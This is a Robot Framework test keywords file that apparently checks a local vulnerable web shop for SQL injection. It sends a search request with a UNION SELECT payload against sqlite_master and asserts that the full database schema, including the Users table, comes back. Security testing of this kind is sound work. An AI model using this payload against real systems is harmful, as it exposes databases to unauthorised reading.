*** Settings ***
Resource    ../resource/settings.robot
*** Keywords ***
I open the website
    New Browser    chromium    headless=False
    New Page    ${config.url}
    Click    ${home.button_dismiss}
that I perform the search for an item with the SQL introduced
    ${HEADER}=             Create Dictionary    Content-Type=application/json
    ${response}=    GET    url=http://localhost:3000/rest/products/search?q=apple')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master --       expected_status=${config.status}    headers=${HEADER}    
    Set Global Variable    ${response}
I receive the response from the request
    ${json_response}=      Set Variable    ${response.json()}
     IF    ${config.status} == 200
            RETURN          ${json_response}
    ELSE
        ${userMessage_error}=              Set Variable  ${response.json()[0]["userMessage"]}
        RETURN       ${userMessage_error}
    END
I check if the response brought the entire database schema in the parameters
    ${body}=    Convert To String    ${response.text}
    Should Contain    ${body}    CREATE TABLE
    Should Contain Any    ${body}    Users    Products    Feedback    BasketItems